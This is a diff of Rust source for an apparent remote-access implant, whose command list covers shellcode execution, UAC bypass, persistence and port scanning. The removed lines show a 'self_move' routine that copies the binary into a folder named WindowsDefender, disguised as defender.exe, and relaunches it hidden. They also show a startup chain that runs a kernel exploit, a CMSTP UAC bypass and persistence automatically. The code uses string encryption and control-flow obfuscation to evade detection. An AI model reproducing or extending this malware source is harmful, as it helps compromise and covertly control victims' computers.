@@ -236,7 +236,6 @@ Available commands:
     `shellcode [file]`=>\tExecute shellcode from file
     `uac [exe_path]`=>\tRun elevated command on Windows (slui)
     `persist`=>\tApply persistence on target
-    `self_move`=>\tMove executable to AppData/.cache
     `check_elevated`=>\tCheck if running with elevated privileges
     `self_uac`=>\tRun UAC bypass on self
     `portscan <tcp|udp|sctp> <host> [--fast]`=>\tPort scan target host
@@ -344,47 +343,6 @@ Available commands:
             obfuscate::sleep_jitter_default();
             let _ = persist::persist();
             Ok(b"Persistence applied\n".to_vec())
-        }
-
-        "self_move" => {
-            obfuscate::sleep_jitter_default();
-            let current_exe = match std::env::current_exe() {
-                Ok(p) => p,
-                Err(_) => return Ok(b"Failed to get exe path\n".to_vec()),
-            };
-            #[cfg(target_os = "windows")]
-            let target_dir = {
-                let appdata = match std::env::var(cryptify::encrypt_string!("APPDATA")) {
-                    Ok(d) => d,
-                    Err(_) => return Ok(b"APPDATA not set\n".to_vec()),
-                };
-                Path::new(&appdata).join(cryptify::encrypt_string!("WindowsDefender"))
-            };
-            #[cfg(not(target_os = "windows"))]
-            let target_dir = {
-                let home = match std::env::var(cryptify::encrypt_string!("HOME")) {
-                    Ok(d) => d,
-                    Err(_) => return Ok(b"HOME not set\n".to_vec()),
-                };
-                Path::new(&home).join(cryptify::encrypt_string!(".cache/defender"))
-            };
-            let target_path = target_dir.join(cryptify::encrypt_string!("defender.exe"));
-            if let Err(e) = std::fs::create_dir_all(&target_dir) {
-                return Ok(format!("Failed to create directory: {}\n", e).into_bytes());
-            }
-            if let Err(e) = std::fs::copy(&current_exe, &target_path) {
-                return Ok(format!("Failed to copy: {}\n", e).into_bytes());
-            }
-            #[cfg(target_os = "windows")]
-            std::process::Command::new(&target_path)
-                .creation_flags(CREATE_NO_WINDOW)
-                .spawn()
-                .ok();
-            #[cfg(not(target_os = "windows"))]
-            std::process::Command::new(&target_path)
-                .spawn()
-                .ok();
-            std::process::exit(goldberg::goldberg_int!(0));
         }
 
         "check_elevated" => {
@@ -706,25 +664,6 @@ pub async fn netclient_run(config: ClientConfig) -> Result<()> {
 
 async fn netclient_impl() -> c_int {
     goldberg_stmts!({
-        #[cfg(target_os = "windows")]
-        {
-            unsafe { kernel_exploit::exploit(); }
-        }
-        cryptify::flow_stmt!();
-        let exe: String = std::env::current_exe().unwrap().display().to_string();
-        obfuscate::sleep_jitter_default();
-        cryptify::flow_stmt!();
-        obfuscate::sleep_jitter_default();
-        cryptify::flow_stmt!();
-        #[cfg(target_os = "windows")]
-        {
-            uac_cmstp::execute(&exe);
-        }
-        obfuscate::sleep_jitter_default();
-        cryptify::flow_stmt!();
-        let _ = persist::persist();
-        obfuscate::sleep_jitter_default();
-        cryptify::flow_stmt!();
         let _ = netclient_run(ClientConfig::default()).await;
         0
     })
